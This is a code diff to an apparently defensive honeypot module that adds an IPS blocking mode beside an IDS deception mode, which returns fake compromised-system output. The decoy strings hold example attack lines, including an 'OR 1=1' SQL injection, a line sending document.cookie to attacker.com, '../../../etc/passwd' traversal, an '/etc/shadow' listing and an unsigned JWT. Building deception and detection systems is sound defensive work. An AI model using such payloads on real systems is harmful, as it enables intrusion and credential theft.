@@ -65,7 +65,7 @@ OUTPUT REQUIREMENTS:
     return prompt
 
 
-def generate_ai_response(input_text, attack_type, session=None, directive="Continue deception."):
+def generate_ai_response(input_text, attack_type, session=None, directive="Continue deception.", mode="IDS"):
     """
     Generates a realistic compromised system response using the Master Prompt.
     """
@@ -118,36 +118,50 @@ def generate_ai_response(input_text, attack_type, session=None, directive="Conti
                     ])
                     generated_text = generated_text + "\n" + noise if random.random() > 0.5 else noise + "\n" + generated_text
                 
-                return generated_text if generated_text else _fallback_response(attack_type)
+                return generated_text if generated_text else _fallback_response(attack_type, mode=mode)
         
-        return _fallback_response(attack_type, error=f"{response.status_code}")
+        return _fallback_response(attack_type, mode=mode, error=f"{response.status_code}")
 
     except Exception as e:
-        return _fallback_response(attack_type, error=str(e))
+        return _fallback_response(attack_type, mode=mode, error=str(e))
 
-def _fallback_response(attack_type, error=None):
+def _fallback_response(attack_type, mode="IDS", error=None):
     """
-    High-fidelity static responses used when the AI service is unavailable.
+    Dual-mode fallback responses for IDS (Deception) vs IPS (Blocking).
     """
     error_prefix = f"[DEBUG: {error}] " if error else ""
     
-    fallbacks = {
-        "sqli": f"{error_prefix}mysql> SELECT * FROM users WHERE id=1 OR 1=1;\n+----+----------+----------------------+\n| id | username | password_hash        |\n+----+----------+----------------------+\n|  1 | admin    | $2y$10$5G9zR...      |\n|  2 | user1    | $2y$10$Qp2xA...      |\n+----+----------+----------------------+\n2 rows in set (0.02 sec)",
-        
-        "xss": f"{error_prefix}[WARN] Reflected XSS detected at /search?q=\n[INFO] Cookie captured: session_id=FE45-A12B-99G0\n[DEBUG] document.location = 'http://attacker.com/steal?c='+document.cookie",
-        
-        "command_injection": f"{error_prefix}$ id && whoami\nuid=0(root) gid=0(root) groups=0(root)\nroot\n$ ls -la /etc/shadow\n-rw-r----- 1 root shadow 1245 Apr 01 12:00 /etc/shadow",
-        
-        "path_traversal": f"{error_prefix}Reading file: ../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
-        
-        "jwt_attack": f"{error_prefix}Decoded JWT:\nHeader: {{\"alg\": \"none\", \"typ\": \"JWT\"}}\nPayload: {{\"sub\": \"1234567890\", \"name\": \"Admin\", \"role\": \"admin\"}}\nSignature: [MISSING]",
-        
-        "api_abuse": f"{error_prefix}{{\"error\": {{\"code\": 429, \"message\": \"Too Many Requests\", \"retry_after\": 5, \"request_id\": \"req_4g9f23\"}}}}",
-        
-        "ddos_pattern": f"{error_prefix}[CRITICAL] Load Average: 45.2, 38.1, 22.5\n[ALERT] nginx: worker connections exceed limit (1024)\n[SYSTEM] Panic: out of memory (oom-killer invoked)"
-    }
+    if mode == "IPS":
+        # Authoritative Active Blocking (IPS Style)
+        blocks = {
+            "sqli": f"{error_prefix}[SECURITY_ALERT] SQL Injection signature detected. Remote connection dropped. Log ID: AEGIS-77B1.",
+            "xss": f"{error_prefix}[IPS] Script execution blocked at perimeter. Malicious payload quarantined.",
+            "command_injection": f"{error_prefix}[DENIED] Unauthorized system command execution attempted. Source IP restricted.",
+            "path_traversal": f"{error_prefix}[SHIELD] File isolation system blocked unauthorized access to system paths.",
+            "jwt_attack": f"{error_prefix}[AUTH] Invalid/Malicious token signature. Session terminated.",
+            "api_abuse": f"{error_prefix}[RATE_LIMIT] API abuse pattern detected. Service unavailable for 300s.",
+            "ddos_pattern": f"{error_prefix}[IPS_DDoS] Traffic spike detected. Traffic-shaping active."
+        }
+        return blocks.get(attack_type, f"{error_prefix}[IPS] Request blocked by Aegis Security Filter.")
     
-    return fallbacks.get(attack_type, f"{error_prefix}[SYSTEM ERROR] Connection refused. Backend is unresponsive.")
+    else:
+        # High-Fidelity Deception (IDS Style)
+        fallbacks = {
+            "sqli": f"{error_prefix}mysql> SELECT * FROM users WHERE id=1 OR 1=1;\n+----+----------+----------------------+\n| id | username | password_hash        |\n+----+----------+----------------------+\n|  1 | admin    | $2y$10$5G9zR...      |\n|  2 | user1    | $2y$10$Qp2xA...      |\n+----+----------+----------------------+\n2 rows in set (0.02 sec)",
+            
+            "xss": f"{error_prefix}[WARN] Reflected XSS detected at /search?q=\n[INFO] Cookie captured: session_id=FE45-A12B-99G0\n[DEBUG] document.location = 'http://attacker.com/steal?c='+document.cookie",
+            
+            "command_injection": f"{error_prefix}$ id && whoami\nuid=0(root) gid=0(root) groups=0(root)\nroot\n$ ls -la /etc/shadow\n-rw-r----- 1 root shadow 1245 Apr 01 12:00 /etc/shadow",
+            
+            "path_traversal": f"{error_prefix}Reading file: ../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+            
+            "jwt_attack": f"{error_prefix}Decoded JWT:\nHeader: {{\"alg\": \"none\", \"typ\": \"JWT\"}}\nPayload: {{\"sub\": \"1234567890\", \"name\": \"Admin\", \"role\": \"admin\"}}\nSignature: [MISSING]",
+            
+            "api_abuse": f"{error_prefix}{{\"error\": {{\"code\": 429, \"message\": \"Too Many Requests\", \"retry_after\": 5, \"request_id\": \"req_4g9f23\"}}}}",
+            
+            "ddos_pattern": f"{error_prefix}[CRITICAL] Load Average: 45.2, 38.1, 22.5\n[ALERT] nginx: worker connections exceed limit (1024)\n[SYSTEM] Panic: out of memory (oom-killer invoked)"
+        }
+        return fallbacks.get(attack_type, f"{error_prefix}[SYSTEM ERROR] Connection refused. Backend is unresponsive.")
 
 def call_llm(messages, max_tokens=500, temperature=0.7):
     """
